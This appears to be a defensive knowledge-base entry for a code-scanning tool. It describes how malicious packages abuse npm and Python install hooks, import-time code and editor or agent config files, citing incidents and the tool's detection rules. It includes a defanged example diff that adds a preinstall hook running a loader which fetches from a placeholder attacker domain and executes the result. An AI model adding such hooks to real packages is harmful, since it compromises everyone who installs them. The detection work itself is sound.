# Install scripts and other auto-run hooks

**Type:** Package & maintainer takeover · **When:** 2015 to 2026 · **Status:** confirmed (attack class)

## What happened
Package managers can run code when a package is installed. Malicious packages use this trigger more than any other. Ohm et al. found 56% of 174 malicious packages fire on install (training). A 2026 study found preinstall scripts in 61.15% of malicious npm packages.

Real uses from the notes:
- `preinstall`: ua-parser-js, coa, rc (2021); [Shai-Hulud 2.0](shai-hulud-2.md) moved to preinstall so it runs even if install fails; [ChainDrop](chaindrop-keyv-2026.md) replaced the whole `scripts` object with `preinstall: node setup.mjs`.
- `postinstall`: [Shai-Hulud 1](shai-hulud-1.md) (`node bundle.js`), [Nx](nx-s1ngularity.md) (`telemetry.js`), [axios](axios-2026.md)'s `plain-crypto-js@4.2.1`, which dropped a remote-access tool and then removed the hook.
- `prepare`: runs when a package is installed from a git URL.
- bin entry: `@bitwarden/cli@2026.4.0` had both a preinstall and a `bw` bin entry as a second trigger.
- Import time: [torchtriton](pytorch-torchtriton.md) ran on `import triton`.
- Python: `setup.py` runs code at install. `.pth` files in site-packages run on every Python start. No real `.pth` incident was confirmed in the notes.
- Outside package managers: ChainDrop wrote `.vscode/tasks.json` and `.claude/settings.json`.

## How it got in
1. Add or change a lifecycle script in `package.json` or `setup.py`.
2. Point it at a small loader file.
3. The loader fetches or decodes the real payload.

## Why it was hard to spot
- Install scripts are normal for many packages.
- The hook can be removed after it runs (axios).

## Signs to look for
- In one change: a new or changed `preinstall`/`postinstall`/`prepare`; the whole `scripts` block replaced; postinstall switched to preinstall; a new `bin` entry; a new `.pth` file.
- Across changes over time: a patch version that adds both an install script and new network code.

## Defanged example
```
package.json:
- "scripts": { "test": "<test-cmd>" }
+ "scripts": { "preinstall": "node setup.mjs" }
setup.mjs:  fetch("<attacker-domain>") then run it
```

## How Pushguard catches it
- **Diff rules:** `js-install-hook-added`, `py-install-hook-added`, `py-sitecustomize`, `editor-autorun-changed`, `agent-tool-config-changed`.
- **Dependency checks:** `dependency-install-script` (npm) for newly added dependencies.
- **Detonation:** runs install / import / execute with no network.

## References
- [CERT-EU SA2021-057 (search-summary)](https://www.cert.europa.eu/publications/security-advisories/2021-057/)
- [Invicti on Shai-Hulud 2.0 (search-summary)](https://www.invicti.com/blog/web-security/shai-hulud-2-worm-supply-chain-attack-on-npm-dependencies)
- [Datadog on ChainDrop (fetched)](https://securitylabs.datadoghq.com/articles/npm-worm-compromises-popular-npm-packages/)
- [Endor Labs on axios (search-summary)](https://www.endorlabs.com/learn/npm-axios-compromise)
- [Unit 42 (fetched)](https://unit42.paloaltonetworks.com/monitoring-npm-supply-chain-attacks/)
- [Python docs, site (training)](https://docs.python.org/3/library/site.html)
- [Ohm et al. (training)](https://arxiv.org/abs/2005.09535); [arXiv 2603.27549](https://arxiv.org/abs/2603.27549)
